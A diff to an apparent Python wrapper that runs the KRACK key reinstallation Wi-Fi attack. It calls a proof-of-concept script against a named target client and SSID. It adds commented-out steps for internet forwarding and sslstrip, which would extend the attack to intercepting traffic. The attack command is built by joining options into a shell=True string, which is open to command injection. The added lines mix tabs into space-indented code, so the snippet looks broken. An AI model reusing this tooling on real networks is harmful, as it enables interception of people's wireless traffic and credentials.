@@ -113,7 +113,7 @@ def main():
             log.info("Restoring internet connection.")
             subprocess.call(["./restoreClientWifi.sh"])
                 
-    # Running attack scripts
+    # Running attack scripts 
     elif options.attack and options.mon and options.rogue and options.target and options.targetSSID:
         try:
             print("Performing key reinstallation attack")
@@ -122,7 +122,9 @@ def main():
             with open('./attackOutput.txt', 'w') as attackOutput:
                 subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                  options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
-            	attackParser() 
+		#subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"]) 
+		#subprocess.call(["sslstrip -w sslstrip.log &"])           	
+		attackParser() 
         except KeyboardInterrupt:
             log.info("Cleaning up and restoring wifi ...")
             subprocess.call(["./restoreClientWifi.sh"])
